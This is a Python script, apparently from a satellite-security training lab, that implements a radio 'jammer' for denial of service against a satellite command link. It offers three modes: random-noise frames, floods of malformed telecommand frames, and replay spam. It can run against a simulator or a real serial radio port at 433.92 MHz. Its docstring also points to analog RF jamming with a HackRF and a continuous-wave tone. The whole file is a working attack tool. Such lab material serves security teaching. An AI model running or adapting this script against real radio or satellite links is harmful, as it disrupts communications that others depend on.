"""
Jammer — bus-level denial of service.

Three modes:

  --mode noise       Transmit random bytes at high rate. Each frame
                     fails the receiver's CRC; the receive thread
                     spends all its time chewing junk instead of
                     processing real telemetry.

  --mode flood-tc    Transmit malformed TC frames at high rate. At
                     security level >= 1 every one fails auth; the
                     satellite's RX path is busy.

  --mode replay-spam Take a captured frame and retransmit it at high
                     rate. Effective even at L2 — replay-rejected
                     frames still consume RX cycles.

In reality, RF jamming is power vs. RX signal strength. Semaeopus's
simulator can model the "RX is busy" denial channel; for the
"swamp the receiver's analog front-end" channel you need a HackRF
and a CW tone (see L10).
"""

import argparse
import os
import random
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, ROOT)

from protocol import space_packet as sp


def make_noise_frame():
    n = random.randint(8, 40)
    return bytes([n]) + bytes(random.randrange(256) for _ in range(n))


def make_bad_tc_frame(seq):
    return sp.encode(sp.TYPE_TC, random.choice([0x080, 0x083, 0x0FF]),
                     seq, bytes(random.randrange(256) for _ in range(8)))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port")
    ap.add_argument("--sim", action="store_true")
    ap.add_argument("--node-id", default="JAMR")
    ap.add_argument("--mode", choices=["noise", "flood-tc", "replay-spam"],
                    default="noise")
    ap.add_argument("--replay-frame", help="hex frame for --mode replay-spam")
    ap.add_argument("--rate", type=float, default=50.0, help="frames / second")
    ap.add_argument("--duration", type=float, default=15.0)
    ap.add_argument("--freq", type=int, default=433_920_000)
    ap.add_argument("--sync", default="d391")
    ap.add_argument("--bitrate", type=int, default=9600)
    args = ap.parse_args()

    if not args.sim and not args.port:
        ap.error("--port required unless --sim")
    if args.mode == "replay-spam" and not args.replay_frame:
        ap.error("--replay-frame required for --mode replay-spam")

    from sim.sim_link import make_link
    link = make_link(args, default_node_id=args.node_id)
    time.sleep(0.5)
    link.send_cfg(args.freq, int(args.sync, 16), args.bitrate)

    replay_frame = bytes.fromhex(args.replay_frame) if args.replay_frame else None
    period = 1.0 / args.rate
    deadline = time.time() + args.duration
    n = 0
    seq = 1
    print(f"jamming mode={args.mode}  rate={args.rate}/s  duration={args.duration}s")
    while time.time() < deadline:
        if args.mode == "noise":
            frame = make_noise_frame()
        elif args.mode == "flood-tc":
            frame = make_bad_tc_frame(seq)
            seq = (seq + 1) & 0x3FFF
        else:
            frame = replay_frame
        link.send_tx(frame)
        n += 1
        time.sleep(period)
    print(f"sent {n} junk frames in {args.duration}s")


if __name__ == "__main__":
    main()
